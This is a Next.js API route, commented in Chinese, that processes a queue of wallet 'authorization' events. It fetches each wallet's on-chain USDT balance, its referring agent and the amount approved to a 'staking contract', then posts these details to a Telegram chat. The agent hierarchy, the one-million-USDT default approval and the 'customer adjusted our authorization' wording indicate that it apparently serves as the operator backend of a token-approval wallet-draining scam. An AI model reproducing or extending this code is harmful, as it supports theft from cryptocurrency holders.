import { NextRequest, NextResponse } from 'next/server'
import { createClient } from '@supabase/supabase-js'

export const dynamic = 'force-dynamic'

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!
)

// ETH主网USDT合约地址
const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
const STAKING_CONTRACT = process.env.STAKING_CONTRACT_ADDRESS || '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218'
const ETH_RPC_URL = 'https://ethereum.publicnode.com'

// Telegram Bot配置
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ''
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || ''

/**
 * 获取链上USDT余额
 */
async function getOnChainUSDTBalance(address: string): Promise<number> {
  try {
    // 使用现有的区块链余额API
    const response = await fetch(`${process.env.NEXT_PUBLIC_APP_URL || 'https://ethmax.vercel.app'}/api/blockchain/wallet-balance?address=${address}`)
    const data = await response.json()
    
    if (data.success) {
      console.log(`✅ 获取链上USDT余额成功: ${address} = ${data.data.usdt_balance} USDT`)
      return data.data.usdt_balance || 0
    } else {
      console.error('❌ 获取链上USDT余额失败:', data.error)
      return 0
    }
  } catch (error) {
    console.error('❌ 获取链上USDT余额异常:', error)
    return 0
  }
}

/**
 * 获取用户详细信息
 */
async function getUserInfo(wallet_address: string): Promise<any> {
  try {
      // 查询用户基本信息
      const { data: userData, error: userError } = await supabase
        .from('nh_member_new')
        .select(`
          id,
          wallet_address,
          referred_by,
          is_active,
          created_at
        `)
        .eq('wallet_address', wallet_address)
        .eq('is_active', true)
        .single()

    if (userError || !userData) {
      console.error('获取用户信息失败:', userError)
      return null
    }

    let topAgent = null
    
    // 如果有推荐人，查询推荐人信息
    if (userData.referred_by) {
      const { data: agentData } = await supabase
        .from('nh_agents')
        .select('id, agent_name, agent_nickname')
        .eq('id', userData.referred_by)
        .single()
      
      topAgent = agentData
    }

    return {
      ...userData,
      topAgent
    }
  } catch (error) {
    console.error('获取用户信息异常:', error)
    return null
  }
}

/**
 * 构建授权通知消息
 */
async function buildAuthorizeMessage(notification: any): Promise<string> {
  const data = notification.notification_data
  const address = data.authAddress || data.address || notification.user_address

  // 获取链上USDT余额
  const onChainBalance = await getOnChainUSDTBalance(address)
  
  console.log(`🔍 获取链上USDT余额: ${address} = ${onChainBalance} USDT`)

  // 获取用户详细信息
  const userInfo = await getUserInfo(address)
  
  // 按授权顺序生成用户编号（基于用户ID生成）
  const userNumber = userInfo?.id ? Math.abs(userInfo.id.split('').reduce((a, b) => { a = ((a << 5) - a) + b.charCodeAt(0); return a & a; }, 0)) % 1000000 : 'N/A'
  
  // 判断是否使用代理链接注册
  const hasReferrer = userInfo?.referred_by && userInfo.referred_by !== 'null' && userInfo.referred_by !== null
  const topAgent = hasReferrer ? (userInfo?.topAgent?.agent_name || '代理名称') : '默认代理'
  const agentNickname = hasReferrer ? (userInfo?.topAgent?.agent_nickname || '代理昵称') : '直链授权'
  const userRemark = '暂无备注' // 暂时硬编码，因为user_remark字段不存在
  const isActive = userInfo?.is_active === true ? '是' : '否'

  return `钱包余额: ${onChainBalance.toFixed(6)}
顶层代理: ${topAgent}
代理昵称: ${agentNickname}
用户编号: ${userNumber}
用户备注: ${userRemark}
是否活动: ${isActive}
用户钱包: 
${address}
授权金额: ${data.authAmount || '1000000'} USDT
客户地址: 
${address.toLowerCase()}
授权对象: 
${STAKING_CONTRACT}
执行操作: 客户调整我方授权额度`.trim()
}

/**
 * 发送Telegram消息
 */
async function sendTelegramMessage(message: string): Promise<{ success: boolean; messageId?: string; error?: string }> {
  console.log('🔍 Telegram配置检查:', {
    hasToken: !!TELEGRAM_BOT_TOKEN,
    hasChatId: !!TELEGRAM_CHAT_ID,
    tokenLength: TELEGRAM_BOT_TOKEN?.length || 0,
    chatId: TELEGRAM_CHAT_ID
  })
  
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('❌ Telegram配置缺失，跳过发送')
    console.warn('Token存在:', !!TELEGRAM_BOT_TOKEN)
    console.warn('ChatID存在:', !!TELEGRAM_CHAT_ID)
    return { success: false, error: 'Telegram配置缺失' }
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
    
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML', // 改为HTML格式，更稳定
      }),
    })

    const result = await response.json()

    console.log('🔍 Telegram API响应:', {
      ok: result.ok,
      error_code: result.error_code,
      description: result.description,
      hasMessageId: !!result.result?.message_id
    })

    if (result.ok) {
      console.log('✅ Telegram消息发送成功，消息ID:', result.result?.message_id)
      return { 
        success: true, 
        messageId: result.result?.message_id?.toString() 
      }
    } else {
      const errorMsg = result.description || `错误代码: ${result.error_code}` || '未知错误'
      console.error('❌ Telegram消息发送失败:', result)
      console.error('错误详情:', errorMsg)
      return { success: false, error: errorMsg }
    }
  } catch (error) {
    const errorMsg = error instanceof Error ? error.message : '网络异常'
    console.error('❌ 发送Telegram消息异常:', error)
    return { success: false, error: errorMsg }
  }
}

/**
 * 处理待发送的通知
 */
export async function POST(request: NextRequest) {
  try {
    let body = {}
    try {
      body = await request.json()
    } catch (jsonError) {
      // 如果没有JSON body，使用空对象
      body = {}
    }
    
    // 如果是测试消息构建
    if (body.test_build_message && body.notification) {
      console.log('🧪 测试消息构建...')
      const message = await buildAuthorizeMessage(body.notification)
      console.log('📝 构建的消息模板:')
      console.log(message)
      return NextResponse.json({
        success: true,
        message: '消息构建测试完成',
        built_message: message
      })
    }

    console.log('🤖 开始处理Telegram通知...')

    // 获取所有待发送的通知
    const { data: notifications, error: fetchError } = await supabase
      .from('telegram_notification_queue')
      .select('*')
      .eq('is_sent', false)
      .order('created_at', { ascending: true })
      .limit(10)

    if (fetchError) {
      console.error('❌ 获取待发送通知失败:', fetchError)
      return NextResponse.json({ success: false, error: fetchError.message }, { status: 500 })
    }

    if (!notifications || notifications.length === 0) {
      console.log('ℹ️ 没有待发送的通知')
      return NextResponse.json({ success: true, message: '没有待发送的通知', processed: 0 })
    }

    console.log(`📨 找到 ${notifications.length} 条待发送通知`)

    let processedCount = 0
    let successCount = 0

    for (const notification of notifications) {
      try {
        console.log(`处理通知 ${notification.id}...`)

        let message = ''

        // 根据通知类型构建消息
        switch (notification.notification_type) {
          case 'user_authorize':
            message = await buildAuthorizeMessage(notification)
            break
          case 'wallet_transaction':
            message = notification.notification_data.message || '钱包动账通知'
            break
          case 'user_authorize_success':
            message = `✅ <b>用户授权成功</b>\n\n钱包地址: <code>${notification.user_address}</code>\n状态: 已添加到钱包监听\n时间: ${new Date(notification.created_at).toLocaleString('zh-CN')}`
            break
          default:
            message = `<b>📢 系统通知</b>\n\n类型: ${notification.notification_type}\n用户: ${notification.user_address}\n数据: ${JSON.stringify(notification.notification_data, null, 2)}\n时间: ${new Date(notification.created_at).toLocaleString('zh-CN')}`
        }

        // 发送Telegram消息
        const result = await sendTelegramMessage(message)

        // 更新通知状态
        const updateData: any = {
          is_sent: result.success,
          retry_count: (notification.retry_count || 0) + (result.success ? 0 : 1),
          error_message: result.error || null
        }

        if (result.success) {
          updateData.sent_at = new Date().toISOString()
          updateData.telegram_message_id = result.messageId || null
        }

        console.log(`🔍 更新通知 ${notification.id} 状态:`, updateData)

        const { error: updateError } = await supabase
          .from('telegram_notification_queue')
          .update(updateData)
          .eq('id', notification.id)

        if (updateError) {
          console.error(`❌ 更新通知 ${notification.id} 状态失败:`, updateError)
        } else {
          console.log(`✅ 通知 ${notification.id} 状态已更新: ${result.success ? '成功' : '失败'}`)
          if (result.success && result.messageId) {
            console.log(`📨 Telegram消息ID: ${result.messageId}`)
          }
          if (!result.success && result.error) {
            console.log(`❌ 错误信息: ${result.error}`)
          }
        }

        processedCount++
        if (result.success) successCount++

        // 避免发送过快
        await new Promise(resolve => setTimeout(resolve, 1000))

      } catch (error) {
        console.error(`❌ 处理通知 ${notification.id} 异常:`, error)
        
        // 更新错误状态
        await supabase
          .from('telegram_notification_queue')
          .update({
            retry_count: notification.retry_count + 1,
            error_message: error instanceof Error ? error.message : '未知错误'
          })
          .eq('id', notification.id)

        processedCount++
      }
    }

    console.log(`🎉 处理完成: 总计 ${processedCount} 条，成功 ${successCount} 条`)

    return NextResponse.json({
      success: true,
      message: `处理完成: 总计 ${processedCount} 条，成功 ${successCount} 条`,
      processed: processedCount,
      successful: successCount
    })

  } catch (error) {
    console.error('❌ 处理Telegram通知异常:', error)
    return NextResponse.json(
      { success: false, error: '服务器内部错误: ' + (error instanceof Error ? error.message : '未知错误') },
      { status: 500 }
    )
  }
}
